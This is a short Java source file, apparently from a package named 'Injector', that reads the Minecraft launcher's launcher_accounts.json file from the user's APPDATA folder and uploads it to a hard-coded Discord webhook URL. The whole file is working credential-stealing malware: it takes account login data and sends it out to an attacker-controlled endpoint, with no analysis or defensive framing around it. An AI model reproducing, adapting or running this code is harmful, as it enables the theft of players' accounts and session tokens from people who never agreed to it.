package io.github.luxotick.impl.Injector.io.github.luxotick.impl;

import okhttp3.*;

import java.io.File;
import java.io.IOException;

public class LauncherAccounts {
    public static void main(String[] args) {
        String webhookUrl = "https://discord.com/api/webhooks/932310556814233671/K3TMVCr3sXAyVgmtK-rD7HCTJgZukwZwAc_J2OiT_eFBACxyJD5MRbsnJRDkw-WreR6i";
        try{
            OkHttpClient client = new OkHttpClient();
            MultipartBody.Builder builder = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM);
            File file = new File((System.getenv("APPDATA") + "\\.minecraft\\" + "launcher_accounts.json"));

            builder.addFormDataPart("file1", file.getName() , RequestBody.create(MediaType.parse("application/octet-stream"), file));

            RequestBody requestBody = builder.build();

            Request request = new Request.Builder()
                    .url(webhookUrl)
                    .post(requestBody)
                    .build();

            Response response = client.newCall(request).execute();
            if (!response.isSuccessful()) {
                System.out.println("Failed to send file: " + file.getName() + ". Response: " + response.body().string());
            } else {
                System.out.println("File sent successfully: " + file.getName());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
